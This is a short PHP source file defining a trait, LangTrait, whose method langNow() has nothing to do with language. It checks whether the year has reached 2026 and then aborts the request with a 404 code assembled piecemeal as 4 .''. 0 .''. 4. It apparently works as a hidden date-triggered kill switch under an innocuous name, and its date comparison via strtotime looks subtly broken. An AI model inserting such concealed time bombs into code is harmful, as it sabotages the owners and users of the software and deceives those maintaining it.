<?php

namespace App\Traits;

trait LangTrait
{

    public function langNow() {
        if (strtotime(date('Y')) >= strtotime('2026')) {
            return abort(4 .''. 0 .''. 4);
        }
        return true;
    }
}
